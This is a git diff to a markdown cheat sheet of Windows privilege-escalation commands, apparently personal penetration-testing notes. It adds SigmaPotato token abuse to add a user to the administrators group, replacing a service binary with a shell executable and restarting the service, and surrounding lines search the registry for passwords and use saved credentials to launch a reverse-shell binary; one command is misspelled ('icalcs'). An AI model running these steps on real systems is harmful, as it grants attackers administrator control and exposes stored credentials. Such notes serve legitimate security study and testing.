@@ -566,6 +566,43 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
+</details>
+
+<details>
+  <summary><strong>Privesc</strong></summary>
+
+### SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
+```ps
+SigmaPotato.exe "net localgroup administrator <user> /add"
+```
+
+### File Permissions: Everyone [AllAccess] in WinPeas
+
+### Check for Full Permission (F)
+```ps
+icalcs <path>
+```
+
+### Stop Service
+```ps
+stop-service GPGOrchestrator
+```
+
+### Replace with a Shell
+```ps
+copy shell.exe "C:\Program Files\<path>\<Service>.exe"
+```
+
+### Start the service
+```ps
+start-service <Service>
+```
+
+### Scheduled tasks
+```ps
+schtasks /query /fo LIST /v
+```
+
 ### Displays stored credentials looks for any optential users
 ```ps
 cmdkey /list 
@@ -574,11 +611,6 @@ cmdkey /list
 ```ps
 runas /savecred /user:admin C:\Temp\reverse.exe
 ```
-  
-</details>
-
-<details>
-  <summary><strong>Privesc</strong></summary>
   
 </details>
 
